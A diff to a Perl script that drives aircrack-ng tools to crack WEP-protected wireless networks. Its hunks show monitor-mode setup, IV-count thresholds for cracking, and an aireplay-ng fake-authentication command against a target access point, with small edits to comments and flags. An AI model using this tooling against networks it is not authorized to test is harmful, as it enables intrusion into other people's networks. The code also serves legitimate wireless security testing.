@@ -46,12 +46,13 @@ my $macaddress = '';
 # Initial airodump scan duration (sleeps) when trying to build target AP list
 my $scan_duration = 6;
 
-# Minimum number of IVs collected when we want cracking to begin (20k for 40-bit, 40k for 128-bit)
-my $min_iv = 17000;
-
 # Time to wait before reading the airodump output. 23 seconds/sleeps should be safe on default aircrack-ng installation which updates 
 # .csv files every 20 seconds;
 my $airodumpwait = 4;
+
+# Minimum number of IVs collected when we want cracking to begin (20k for 40-bit, 40k for 128-bit)
+my $min_iv = 17000;
+
 
 
 
@@ -119,8 +120,8 @@ our $set_monitor_error;
 
 ###########################   BEGIN DETECT WIRELESS INTERFACE   ###############################################
 
-# Start each wireless cards in monitor mode using airmon-ng
-#   Detect all wireless card and monitor interface if there's any through the output of airmon-ng
+#   Start each wireless cards in monitor mode using airmon-ng
+#   Obtain the monitor interface if there's any through the output of airmon-ng
 #   Store all cards in %wifi_iface (key = inject interface, value = monitor interface)
 #   If the cards were manually set at the beginning of this script, then don't auto detect;
 
@@ -201,9 +202,6 @@ $ENV{'inject_iface'} = $inject_iface;
 
 unless (defined $macaddress && $macaddress ne ''){
 
-	unless ($inject_iface ne $monitor_iface){
-   	  system "iwconfig $inject_iface mode managed";
-	}
 	open IFCONFIG, "ifconfig $inject_iface |" or die $!;
 	while (<IFCONFIG>){
 	  next unless /HW/;
@@ -223,7 +221,7 @@ unless (defined $macaddress && $macaddress ne ''){
 
 #######################   BEGIN ARGUMENT VERIFICATION #########################
 # We only accept either 'sort', 'connect' (sort and connect can be followed by optional IP or hostname)
-# or just any combination of 1, 6, and 11
+# or just any combination of 1, 6, and 11 for US and 1, 5, 9, 13 for EU non-overlapping channels
 
 
 if (scalar @ARGV > 0 ){
@@ -571,7 +569,7 @@ print "Checking for mac filtering...";
 die "Could not fork aireplay-ng!"  unless defined (my $preauth_pid = open(PREAUTH_IPC, "-|"));
 
 if ($preauth_pid == 0){
-  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress -D 2>&1|" or die $!;
+  open PREAUTH, "aireplay-ng -1 1 -a $all_ap{$all_ap_key}->{'bssid'} $inject_iface -e \'$all_ap{$all_ap_key}->{'ssid'}\' -h $macaddress 2>&1|" or die $!;
   while (<PREAUTH>){
      next if /^\s*$/;
      print;
